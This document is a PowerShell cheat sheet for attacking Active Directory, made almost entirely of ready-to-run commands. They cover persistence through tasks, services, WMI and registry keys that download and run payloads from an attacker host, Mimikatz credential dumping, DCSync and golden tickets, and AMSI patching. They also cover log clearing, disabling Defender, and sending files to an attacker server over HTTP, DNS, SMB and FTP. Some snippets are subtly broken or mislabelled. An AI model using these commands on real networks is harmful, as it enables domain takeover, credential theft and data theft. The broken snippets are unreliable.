# Index 


PowerShell Active Directory (AD) Penetration Testing Cheat Sheet

## 1. Initial Reconnaissance 

#### 1.1 Enumerate Domain Information 

- **Get Domain Information**:
    
    ```powershell
    Get-Domain | Select-Object name, domainmode, domainfunctionallevel
    ```
    
- **Get Domain Controllers**:
    
    ```powershell
    Get-ADDomainController -Filter * | Select-Object Name, IPv4Address
    ```
    
- **Get Domain Forest Information**:
    
    ```powershell
    Get-ADForest | Select-Object ForestMode, RootDomain
    ```
    
- **Get Domain SID**:
    
    ```powershell
    Get-DomainSID
    ```
    

#### 1.2 Enumerate Users 

- **List All Users in Domain**:

```powershell
Get-ADUser -Filter * -Property * | Select-Object Name, SamAccountName, SID
```

- **List Detailed User Information**:

```powershell
Get-ADUser -Identity <UserName> -Properties *
```

- **List All Domain Admin Accounts**

```powershell
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object Name, SamAccountName, UserPrincipalName
```

- **List All Service Accounts**

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Property ServicePrincipalName | Select-Object Name, ServicePrincipalName
```

- **List Last Logon Time of All Domain Users**

```powershell
Get-ADUser -Filter * -Property LastLogonDate | Select-Object Name, LastLogonDate
```

- **Find Locked-Out Accounts**:

```powershell
Search-ADAccount -LockedOut | Select-Object Name, SamAccountName
```

- **List Accounts with "Password never expires" Set**

```powershell
Get-ADUser -Filter 'PasswordNeverExpires -eq $true' -Property SamAccountName, PasswordNeverExpires
```

- **List Accounts with "Password not required" set**:

```
Get-ADUser -Filter 'PasswordNotRequired -eq $true' -Property SamAccountName, PasswordNotRequired
```

#### 1.3 Enumerate Groups 

- **Get All Groups in Domain**:

```powershell
Get-ADGroup -Filter * | Select-Object Name, GroupCategory, GroupScope
```

- **Get Group Members**:

```powershell
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName
```

- **Get List of Users in a Group**:

```powershell
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName
```

- **Check if a User is in a Specific Group**:

```powershell
Get-ADUser <UserName> -Property MemberOf | Select-Object -ExpandProperty MemberOf
```

#### 1.4 Enumerate Computers 

- **Get All Computers in Domain**:

```powershell
Get-ADComputer -Filter * | Select-Object Name, IPv4Address, OperatingSystem, LastLogonDate
```

- **Get Detailed Information of a Specific Computer**:

```powershell
Get-ADComputer -Identity <ComputerName> -Properties *
```

#### 1.5 Enumerate Organizational Units (OUs) 

- **Get All OUs**:

```powershell
Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName
```

- **Get Specific OU Details**:

```powershell
Get-ADOrganizationalUnit -Identity "OU=Finance,DC=example,DC=com"
```

#### 1.6 Enumerate Domain Trusts 

- **Get List of Domain Trusts**:

```powershell
Get-ADTrust -Filter * | Select-Object Name, TrustDirection, TrustType, TrustAttributes
```

- **Enumerate Trusted Domains**:

```powershell
Get-NetDomainTrust
```

#### 1.7 Enumerate Group Policy Objects (GPOs) 

- **List All GPOs in the Domain**:

```powershell
Get-GPO -All | Select-Object DisplayName, GpoStatus, Owner
```

- **Get GPO Permissions**:

```powershell
Get-GPPermissions -All -Domain <DomainName> -DomainController <DomainController>
```

#### 1.8 Enumerate Service Principal Names (SPNs) 

- **Find All SPNs in the Domain**:

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Property ServicePrincipalName | Select-Object SamAccountName, ServicePrincipalName
```

- **Find Kerberoastable Accounts (Accounts with SPNs)**:

```powershell
Get-NetUser -SPN | Select-Object SamAccountName, ServicePrincipalName
```

#### 1.9 Enumerate ACLs and Permissions 

- **Get ACLs for a Specific OU**:

```powershell
Get-Acl "AD:\OU=Finance,DC=example,DC=com" | Format-List
```

-**Enumerate Permissions for All Users in Domain**:

```powershell
Get-ADUser -Filter * -Property ntSecurityDescriptor | ForEach-Object {
    [Security.Principal.SecurityIdentifier] $_.ObjectSID } | Select-Object UserName, ntSecurityDescriptor
```

#### 1.10 Enumerate Privileged Accounts (SID History) 

- **Find Accounts with SID History**:

```powershell
Get-ADUser -Filter {SIDHistory -ne "$null"} -Properties SamAccountName, SIDHistory | Select-Object SamAccountName, SIDHistory
```

## 2. Persistence 

#### 2.1 Create a User Account 

- **Add a User to RDP Group for Remote Access**:

```powershell
Add-ADGroupMember -Identity "Remote Desktop Users" -Members <UserName>
```

- **Set User Password Never Expires**:

```powershell
Set-ADUser -Identity <UserName> -PasswordNeverExpires $true
```

#### 2.2 Add User to Domain Admins Group 

- **Add a New User to Domain Admins Group**:

```powershell
$UserName = "NewAdmin"
$Password = "P@ssw0rd!"
New-ADUser -Name $UserName -AccountPassword (ConvertTo-SecureString $Password -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members $UserName
```

#### 2.3 Persistence via Scheduled Task 

- **Create a Scheduled Task on Remote Machine**:

```powershell
Invoke-WmiMethod -Class Win32_Process -ComputerName <Target_IP> -Name Create -ArgumentList "schtasks /create /tn Backdoor /tr C:\Windows\System32\cmd.exe /sc onstart /ru System"
```

- **Create a Persistent Scheduled Task on a Remote Machine**:

```powershell
Invoke-WmiMethod -Class Win32_Process -ComputerName <Target_IP> -Name Create -ArgumentList "schtasks /create /tn PersistentBackdoor /tr 'powershell.exe -noexit -Command IEX (New-Object Net.WebClient).DownloadString(''http://<attack_ip>:<attack_port>/script.ps1'')' /sc onlogon /ru SYSTEM"
```

- **Create a Hidden Scheduled Task for Persistence**:

```powershell
$TaskName = "UpdateTask"
$Task = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\script.ps1"
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $TaskName -Action $Task -Trigger $Trigger -Settings $Settings -Principal $Principal
```

#### 2.4 Persistence via Services 

- **Create a New Service for Persistence**:

```powershell
Invoke-WmiMethod -Class Win32_Process -ComputerName <Target_IP> -Name Create -ArgumentList "sc create PersistentService binPath= 'C:\Windows\System32\cmd.exe /c powershell.exe -noexit -Command IEX (New-Object Net.WebClient).DownloadString(''http://<attack_ip>:<attack_port>/payload.ps1'')'"
```

- **Configure a Service for Persistence**:

```powershell
New-Service -Name "PersistentService" -BinaryPathName "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\script.ps1" -StartupType Automatic
Start-Service -Name "PersistentService"
```

#### 2.3 Backdoor Domain Controller using Skeleton Key 

- **Load Skeleton Key using Mimikatz**:

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```

#### 2.6 Abuse Group Policy Preferences (GPP) 

- **Search for GPP Passwords in SYSVOL**:

```powershell
Invoke-ACLScanner -Path "\\<domain>\SYSVOL\<domain>\Policies" -FindPasswords
```

- **Decrypt GPP Password**:

```powershell
Invoke-GPPPassword -Path "C:\GPP\GroupPolicy.xml"
```

#### 2.9 WMI Event Subscription for Persistence 

- **Create a WMI Event Subscription for Persistence**:

```powershell
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "PersistentEventFilter"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process'"
    QueryLanguage = "WQL"
}

$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "PersistentConsumer"
    CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Windows\Temp\script.ps1"
}

$Binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

#### 2.10 Registry Modification for Persistence 

- **Persist via Registry Run Key**:

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PersistentBackdoor" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\script.ps1"
```

- **Persist via Image File Execution Options (IFEO)**:

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -Name "Debugger" -Value "C:\Windows\System32\cmd.exe"
```

#### 2.11 DLL Hijacking for Persistence 

- **Identify DLL Hijacking Opportunities**:

```powershell
$VulnDLLs = Get-ChildItem -Path "C:\Program Files\" -Recurse -Filter "*.dll" | ForEach-Object {
    $_ | Get-PEInfo | Where-Object { $_.ImportTable -contains "ntdll.dll" }
}
```

- **Replace Vulnerable DLL with Malicious DLL**:

```powershell
Copy-Item -Path "C:\Malicious.dll" -Destination "C:\Program Files\VulnerableApp\Vuln.dll" -Force
```

## 3. Credential Harvesting 

#### 3.1 Dump Hashes using Invoke-Mimikatz 

- **Load Mimikatz Module**:

```powershell
Import-Module .\Invoke-Mimikatz.ps1
```

- **Dump Credentials from LSASS**:

```powershell
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

- **Dump NTLM Hashes**:

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

#### 3.2 Dump SAM Hashes 

- **Export SAM and SYSTEM Hive**:

```powershell
reg save HKLM\SYSTEM system.hiv
reg save HKLM\SAM sam.hiv
```

- **Load Hives and Dump Hashes**:

```powershell
Invoke-Mimikatz -Command '"lsadump::sam /system:system.hiv /sam:sam.hiv"'
```

## 4. Privilege Escalation 

#### 4.1 Find Privileged Accounts 

- **Find Accounts with Admin Rights**:

```powershell
Get-NetLocalGroupMember -GroupName Administrators -ComputerName <ComputerName>
```

#### 4.2 Search for Sensitive Files 

- **Search for Sensitive Files on Remote Machine**:

```powershell
Invoke-FileFinder -ComputerName <ComputerName> -Path "C$\Users\*\Documents" -FileName *.txt,*.xls,*.pdf
```

#### 4.3 Kerberoasting 

- **Request Service Tickets for Kerberoasting**:

```powershell
Add-Type -AssemblyName System.IdentityModel
$ServiceAccounts = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
$ServiceAccounts | ForEach-Object { Get-SPNTicket -SPN $_.ServicePrincipalName }
```

#### 4.4 Abuse GPO Permissions 

- **Check for Write Permissions on GPO**:

```powershell
Get-DomainGPO | Get-ObjectAcl | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty" }
```

#### 4.5 Abuse Weak Service Permissions 

- **Find Services with Unsecured Permissions**:

```powershell
Get-WmiObject -Class Win32_Service | Where-Object {
    ($_.StartMode -eq "Auto") -and ($_.PathName -notlike "*svchost*") -and (Get-Acl $_.PathName).Access | Where-Object { $_.IdentityReference -eq "Everyone" }
}
```

- **Modify Service for Privilege Escalation**:

```powershell
sc config <ServiceName> binPath= "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\escalation.ps1"
Restart-Service -Name <ServiceName>
```

#### 4.6 Scheduled Task Privilege Escalation 

- **Enumerate Scheduled Tasks**:

```powershell
Get-ScheduledTask | Where-Object { $_.TaskPath -like "\*" }
```

- **Modify Scheduled Task for Escalation**:

```powershell
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\escalation.ps1"
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "EscalationTask" -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM"
```

#### 4.7 Abusing DCOM for Privilege Escalation 

- **Identify Vulnerable DCOM Objects**:

```powershell
Get-CimInstance -ClassName Win32_DCOMApplication | Where-Object { $_.AppID -notlike "{00000000-0000-0000-0000-000000000000}" }
```

- **Exploit DCOM for Privilege Escalation**:

```powershell
Invoke-DCOM -ComputerName <Target_IP> -Command "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\escalation.ps1"
```

#### 4.8 Token Privilege Escalation via Token Manipulation 

- **List Available Tokens**:

```powershell
Invoke-TokenManipulation -Enumerate
```

- **Steal Token from Process for Escalation**:

```powershell
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ImpersonateUser "SYSTEM" -ProcessId <PID>
```

#### 4.9 Bypass User Account Control (UAC) 

- **Bypass UAC via Event Viewer**:

```powershell
$RegistryPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
New-Item -Path $RegistryPath -Force
Set-ItemProperty -Path $RegistryPath -Name "(Default)" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\escalation.ps1"
Invoke-Item -Path "eventvwr.exe"
```

## 5. Lateral Movement 

#### 5.1 PowerShell Remoting 

- **Enable PowerShell Remoting (requires administrative privileges)**:

```powershell
Enable-PSRemoting -Force
```

- **Use PowerShell remoting to execute a command on a remote system**:

```powershell
Invoke-Command -ComputerName <target_ip> -ScriptBlock {whoami}
```

#### 5.2 Invoke WMI 

```powershell
# Execute command on a remote machine using WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -Command whoami" -ComputerName <target_ip>
```

#### 5.3 Invoke DCOM 

- **Execute Command on Remote Machine using DCOM**

```powershell
Invoke-DCOM -ComputerName <Target_IP> -Command "powershell.exe -EncodedCommand <Base64_Command>"
```

#### 5.4 Invoke SMBExec 

- **Execute Command on Remote Machine via SMB**:

```powershell
Invoke-SMBExec -Target <Target_IP> -Command "ipconfig /all"
```

#### 5.5 Pass-the-Hash 

- **PowerShell Pass-the-Hash**:

```powershell
Invoke-WmiMethod -ComputerName <target_ip> -Credential (New-Object System.Management.Automation.PSCredential("<user>", (ConvertTo-SecureString "aad3b435b51404eeaad3b435b51404ee:<hash>" -AsPlainText -Force))) -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"
```

- **Mimikatz Pass-the-Hash**:

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<UserName> /domain:<Domain> /ntlm:<NTLM_Hash> /run:powershell.exe"'
```

#### 5.6 Enumerate Shares 

- **Enumerate Shared Resources on Remote Machine**:

```powershell
Invoke-ShareFinder -ComputerName <ComputerName>
```

## 6. Defense Evasion 

#### 6.1 Clear Event Logs 

- **Clear Security Event Log**:

```powershell
Clear-EventLog -LogName Security
```

- **Clear Application Event Log**:

```powershell
Clear-EventLog -LogName Application
```

#### 6.2 Disable Windows Defender 

- **Disable Windows Defender**:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### 6.3 Remove Execution History 

- **Clear PowerShell Execution History**:

```powershell
Remove-Item -Path (Get-PSReadlineOption).HistorySavePath
```

#### 6.4 Bypass AMSI (Antimalware Scan Interface) 

- **AMSI Bypass using Reflection**:

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

#### 6.5 Obfuscate PowerShell Commands 

- **Obfuscate Commands Using Base64 Encoding**:

```powershell
$Command = "IEX (New-Object Net.WebClient).DownloadString('http://<attack_ip>:<attack_port>/payload.ps1')"
$EncodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
powershell.exe -EncodedCommand $EncodedCommand
```

#### 6.6 Tamper with Event Logs 

- **Disable Auditing Temporarily**:

```powershell
auditpol /set /subcategory:"Logon" /success:disable /failure:disable
```

- **Clear Specific Event Log Entries**:

```powershell
wevtutil cl Security
```

#### 6.7 Remove or Disable Antivirus/EDR 

- **Remove Microsoft Defender Antivirus**:

```powershell
Remove-WindowsFeature -Name Windows-Defender-Features
```

- **Disable EDR Tools**:

```powershell
Stop-Service -Name "EDRServiceName" -Force
```

#### 6.8 Bypass AppLocker 

- **Use regsvr32 to Bypass AppLocker**:

```powershell
regsvr32 /s /n /u /i:http://<attack_ip>/script.sct scrobj.dll
```

- **Use InstallUtil to Bypass AppLocker**:

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\payload.dll
```

#### 6.9 Bypass Application Whitelisting via MSBuild 

- **Use MSBuild to Bypass Application Whitelisting**:

```powershell
msbuild.exe C:\Windows\Temp\payload.xml
```

#### 6.10 Bypass AMSI with Environment Variables 

- **Set Environment Variable to Bypass AMSI**:

```powershell
[Environment]::SetEnvironmentVariable("PSModulePath", "C:\MaliciousModules", "Process")
Import-Module -Name MaliciousModule
```

#### 6.11 Manipulate Antimalware Scan Interface (AMSI) Functionality 

- **Patch AMSI DLL in Memory**:

```powershell
$Script = @"
using System;
using System.Runtime.InteropServices;
public class AMSIBypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch() {
        IntPtr hModule = LoadLibrary("amsi.dll");
        IntPtr address = GetProcAddress(hModule, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(address, (UIntPtr)4, 0x40, out oldProtect);
        Marshal.WriteByte(address, 0xC3);
        VirtualProtect(address, (UIntPtr)4, oldProtect, out oldProtect);
    }
}
"@
Add-Type -TypeDefinition $Script
[AMSIBypass]::Patch()
```

## 7. Data Exfiltration 

#### 7.1 Exfiltrate Data via PowerShell Remoting 

- **Use PowerShell Remoting to Exfiltrate Data**:

```powershell
$Session = New-PSSession -ComputerName <attack_ip> -Credential (Get-Credential)
Copy-Item -Path "C:\SensitiveData.txt" -Destination "C:\Exfil\SensitiveData.txt" -ToSession $Session
Remove-PSSession $Session
```

#### 7.2 Exfiltrate Files via HTTP 

- **Exfiltrate Files using HTTP POST Request**:

```powershell
$FilePath = "C:\SensitiveData.txt"
$Server = "http://<attack_ip>:<attack_port>/upload"
$FileContent = Get-Content $FilePath -Raw
Invoke-WebRequest -Uri $Server -Method POST -Body $FileContent
```

#### 7.3 Encode and Exfiltrate Data via DNS 

- **Encode and Send Data via DNS Queries**:

```powershell
$Data = "Sensitive Data"
$EncodedData = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Data))
nslookup $EncodedData.<attack_ip>
```

- **Exfiltrate Data Using DNS Queries**:

```powershell
$Data = "Sensitive Data"
$EncodedData = [System.Text.Encoding]::UTF8.GetBytes($Data)
$Base32Data = [Convert]::ToBase32String($EncodedData)
nslookup $Base32Data.<attack_ip>
```

#### 7.4 Exfiltrate Data via SMB 

- **Use SMB to Exfiltrate Data to an Attacker-Controlled Server**:

```powershell
New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\<attack_ip>\SharedFolder"
Copy-Item -Path "C:\SensitiveData.txt" -Destination "Z:\"
```

#### 7.5 Exfiltrate Data via ICMP 

- **Exfiltrate Data Using ICMP Packets**:

```powershell
$Data = "Sensitive Data"
$Bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
ForEach ($Byte in $Bytes) {
    ping -n 1 -l 1 <attack_ip> -w 1
}
```

#### 7.6 Exfiltrate Data via WebDAV 

- **Set Up WebDAV Client and Exfiltrate Data**:

```powershell
New-PSDrive -Name "W" -PSProvider FileSystem -Root "\\<attack_ip>\webdav"
Copy-Item -Path "C:\SensitiveData.txt" -Destination "W:\"
```

#### 7.7 Exfiltrate Data via FTP 

- **Upload Data via FTP**:

```powershell
$ftp = [System.Net.FtpWebRequest]::Create("ftp://<attack_ip>/SensitiveData.txt")
$ftp.Credentials = New-Object System.Net.NetworkCredential("username", "password")
$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$ftpStream = $ftp.GetRequestStream()
$localFile = "C:\SensitiveData.txt"
[byte[]]$buffer = Get-Content -Path $localFile -AsByteStream
$ftpStream.Write($buffer, 0, $buffer.Length)
$ftpStream.Close()
```

## 9. Post-Exploitation Techniques 

#### 9.1 Steal Access Tokens 

- **Steal a Token from a Process (e.g., lsass.exe)**:

```powershell
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId <PID_of_lsass>
```

#### 9.2 DCSync Attack 

- **Perform a DCSync Attack to Dump Credentials**:

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain_name> /user:krbtgt"'
```

- **Use SecretsDump (via impacket)**:

```powershell
secretsdump.py -just-dc-user krbtgt <domain>/<username>:<password>@<target_ip>
```

#### 9.3 Golden Ticket Attack 

- **Create a Golden Ticket using Mimikatz**:

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "kerberos::golden /domain:<domain_name> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /user:Administrator /ticket:<path_to_ticket>"'
```

- **Inject the Golden Ticket**:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt golden.kirbi"'
```

#### 9.4 Silver Ticket Attack 

- **Create a Silver Ticket for a Specific Service**:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:<ServiceUser> /domain:<Domain> /sid:<Domain_SID> /target:<Target_SPNSuffix> /rc4:<NTLM_Hash> /service:<ServiceName> /ticket:silver.kirbi"'
```

- **Inject the Silver Ticket**:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt silver.kirbi"'
```

#### 9.5 Overpass-the-Hash (Pass-the-Key) 

- **Use NTLM Hash to Request TGT**:

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<UserName> /domain:<Domain> /aes256:<AES_Key> /run:powershell.exe"'
```

#### 9.6 Abuse RID 500 Accounts 

- **Enable Disabled RID 500 Account (if applicable)**:

```powershell
Enable-ADAccount -Identity "Administrator"
```

- **Reset Password of RID 500 Account**:

```powershell
Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ssword!" -Force)
```

#### 9.7 Active Directory Certificate Services (ADCS) Exploitation 

- **Enumerate Available Certificate Templates**:

```powershell
Get-CertificationAuthority | Get-CertificateTemplate | Select-Object Name, DisplayName, pKCS10KeyUsage
```

- **Request a Certificate Using a Vulnerable Template**:

```powershell
$Cert = Get-Certificate -Template "VulnerableTemplate" -CertStoreLocation "Cert:\CurrentUser\My" -DnsName "example.com" -Subject "CN=MaliciousUser"
```

- **Use Certificate for Authentication**:

```powershell
Invoke-PowerShellWebRequest -Uri "https://<target_ip>" -Certificate $Cert
```

#### 9.8 Kerberos Attacks (Golden Ticket, Silver Ticket, etc.) 

- **Create a Golden Ticket with Additional Attributes**:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain> /sid:<Domain_SID> /krbtgt:<NTLM_Hash> /extra /rc4:<RC4_Hash> /aes256:<AES256_Key> /ticket:golden.kirbi"'
```

- **Use the Golden Ticket**:

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt golden.kirbi"'
```

#### 9.9 SID History Abuse 

- **Add SID History to a User Account**:

```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch /user:<UserName> /domain:<Domain> /sid:<SID_History>"'
```

- **Authenticate Using SID History**:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:<UserName> /domain:<Domain> /sid:<Domain_SID> /krbtgt:<NTLM_Hash> /rc4:<RC4_Hash> /ticket:golden.kirbi"'
```

#### 9.10 Abuse DNSAdmins Group for Exploitation 

- **Abuse DNSAdmins for Remote Code Execution**:

```powershell
Add-DnsServerResourceRecordCName -Name "MaliciousRecord" -HostNameAlias "<attack_ip>" -ZoneName "<Domain>"
Invoke-Command -ScriptBlock { nslookup MaliciousRecord.<Domain> }
```

- **Clean Up DNS Record**:

```powershell
Remove-DnsServerResourceRecord -Name "MaliciousRecord" -ZoneName "<Domain>"
```